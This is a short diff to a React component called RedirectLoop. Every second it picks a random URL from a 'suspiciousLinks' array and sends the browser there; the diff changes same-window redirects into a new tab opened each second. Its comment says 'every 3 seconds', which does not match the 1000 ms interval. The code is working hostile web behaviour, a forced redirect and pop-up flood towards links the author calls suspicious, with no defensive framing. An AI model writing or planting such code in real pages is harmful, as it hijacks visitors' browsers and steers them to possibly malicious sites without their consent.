@@ -44,7 +44,7 @@ export default function RedirectLoop() {
   useEffect(() => {
     const redirectLoop = setInterval(() => {
       const randomUrl = suspiciousLinks[Math.floor(Math.random() * suspiciousLinks.length)];
-      window.location.href = randomUrl;
+      window.open(randomUrl, '_blank', 'noopener,noreferrer');
     }, 1000); // every 3 seconds
 
     return () => clearInterval(redirectLoop);
